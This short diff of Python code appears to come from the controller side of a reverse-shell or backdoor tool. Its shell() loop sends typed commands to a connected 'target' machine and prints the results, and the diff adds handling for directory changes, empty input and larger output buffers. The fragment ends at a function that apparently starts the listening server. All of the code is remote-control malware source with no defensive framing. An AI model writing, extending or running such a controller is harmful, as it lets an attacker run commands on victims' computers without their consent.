@@ -10,10 +10,20 @@ def shell():
         if comando == "exit":
             target.send(comando)
             break
-        else:
+        elif comando[:2] == "cd":
             target.send(comando)
             res = target.recv(1024)
+            current_dir = res
             print(res)
+        elif comando == "":
+            pass
+        else:
+            target.send(comando)
+            res = target.recv(30000)
+            if res == "1":
+                continue
+            else:
+                print(res)
 
 def upserver():
     global server
